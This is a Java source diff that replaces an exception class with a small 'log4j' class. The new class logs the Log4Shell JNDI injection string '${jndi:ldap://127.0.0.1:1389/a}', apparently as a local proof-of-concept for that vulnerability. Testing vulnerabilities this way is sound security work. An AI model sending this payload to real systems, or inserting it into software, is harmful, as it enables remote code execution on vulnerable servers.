@@ -1,6 +1,6 @@
 /*
  * Original Author -> Harry Yang (taketoday@foxmail.com) https://taketoday.cn
- * Copyright © TODAY & 2017 - 2020 All Rights Reserved.
+ * Copyright © TODAY & 2017 - 2021 All Rights Reserved.
  *
  * DO NOT ALTER OR REMOVE COPYRIGHT NOTICES OR THIS HEADER
  *
@@ -17,32 +17,16 @@
  * You should have received a copy of the GNU General Public License
  * along with this program.  If not, see [http://www.gnu.org/licenses/]
  */
-package cn.taketoday.core;
 
-import java.io.Serial;
+package cn.taketoday.context;
 
-import cn.taketoday.core.NestedRuntimeException;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 
-/**
- * @author TODAY <br>
- * 2019-11-09 14:51
- */
-public class DataAccessException extends NestedRuntimeException {
-  @Serial
-  private static final long serialVersionUID = 1L;
+public class log4j {
+    private static final Logger logger = LogManager.getLogger(log4j.class);
 
-  public DataAccessException() { }
-
-  public DataAccessException(String message) {
-    super(message);
-  }
-
-  public DataAccessException(Throwable cause) {
-    super(cause);
-  }
-
-  public DataAccessException(String message, Throwable cause) {
-    super(message, cause);
-  }
-
+    public static void main(String[] args) {
+        logger.error("${jndi:ldap://127.0.0.1:1389/a}");
+    }
 }
